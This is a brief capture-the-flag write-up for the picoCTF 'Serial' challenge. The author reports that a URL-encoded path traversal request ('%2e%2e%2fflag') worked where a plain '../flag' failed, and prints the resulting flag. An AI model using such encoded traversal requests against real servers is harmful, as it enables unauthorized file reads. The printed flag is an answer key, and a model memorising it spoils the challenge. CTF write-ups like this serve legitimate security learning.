### Serial

So I tried doing this through insecure deserialization for quite a while and couldn't get it, when I read the hint again

"The flag is at ../flag"

path traversal?

no luck with `http://mercury.picoctf.net:42449/../flag`

how about url encoded?

`http://mercury.picoctf.net:42449/%2e%2e%2fflag`

we get the flag!

picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}

I checked with the admin and this bypass wasn't intended, cool that it worked though!